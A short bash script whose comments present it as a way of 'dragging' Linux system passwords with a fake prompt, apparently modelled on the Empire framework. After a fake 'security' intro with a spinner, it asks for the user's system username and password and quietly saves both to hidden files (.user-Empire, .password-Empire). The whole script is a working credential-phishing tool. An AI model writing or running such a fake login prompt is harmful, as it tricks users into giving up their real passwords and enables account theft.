#!/bin/bash
clear
# COLORS TOOL ^_^ 
RED=$(tput setaf 2 && tput bold) #COLOR RED 
GREEN=$(tput setaf 9 && tput bold) #COLOR GREEN
STAND=$(tput sgr0) #COLOR STAND
BLUE=$(tput setaf 2 && tput bold) #COLOR BLUE

#################################################################################
# Twitter www.Twitter.com/GihadAlkmaty
# Github www.Github.com/JihadLkmaty218
# facebook www.facebook.com/GihadAlkmatySy
# Page in facebook www.facebook.com/GihadAlkmaty-hak5
#-------------------------------------------------------
# what is the Script !!
# dragging Passwod System Linux like Prompt in Empire 
# idea GihadAlkmaty@Homjxie
#
#
#
#
####################################################################################
echo -n  security ✔️ Linux = =; #Intro 

sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
clear
echo -e "\e[42mUser,Name System:>"
read target
echo $target >> .user-Empire
clear
echo -e "\e[42mPassword,System your:>"
read target
echo $target >> .password-Empire
echo "Thanks you"
sleep 1.33